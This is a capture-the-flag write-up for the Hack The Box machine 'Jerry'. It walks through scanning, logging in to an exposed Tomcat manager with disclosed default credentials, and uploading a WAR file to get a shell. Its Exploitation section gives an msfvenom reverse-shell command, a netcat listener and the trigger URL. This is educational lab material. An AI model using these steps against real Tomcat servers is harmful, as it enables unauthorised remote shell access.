[**< back**](/README.md)

# HTB - Jerry

![jerry_banner](/_storage/_img/_pentest_labs/_htb/jerry/jerry_banner.jpg)
**Machine**: Jerry
**Author**: Nika Kharebava

## Information Gathering
### NMap
:mag: Initial enumeration using Nmap  
![initial_nmap_scan](/_storage/_img/_pentest_labs/_htb/jerry/initial_nmap_scan.png)
Seems like this one's serving a Apache Tomcat/7.0.88 on port 8080  

### Messing around
![tomcat_discovered](/_storage/_img/_pentest_labs/_htb/jerry/tomcat_discovered.png)  
If we try to login... this happens...  
![apache_login](/_storage/_img/_pentest_labs/_htb/jerry/apache_login.png)  
Credentials get disclosed from configuration file  
![apache_login](/_storage/_img/_pentest_labs/_htb/jerry/creds_disclosed.png)
At first we can not login into the account with these creds, but if we flush cookies then we are greeted with this manager interface  
![apache_login_success](/_storage/_img/_pentest_labs/_htb/jerry/manager_app_successful_login.png)  
Where we can actually upload  
![war_file_upload](/_storage/_img/_pentest_labs/_htb/jerry/war_file_upload.png)  


### Exploitation :microbe: 
We can gain either a web shell or a reverse shell by generating it using venom as a war payload and uploading it into the manager upload page.

**msfvenom**  
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f war -o shell.war`

Now we can setup a netcat listener on an attacker machine
`nc -nlvp 4444` 
Then we can just upload the war file into manager interface and surf it on the browser...  
`http://10.129.157.182:8080/shell`  
and we have a connection with nt/authority...  
![shell_gained](/_storage/_img/_pentest_labs/_htb/jerry/shell_gained.png)
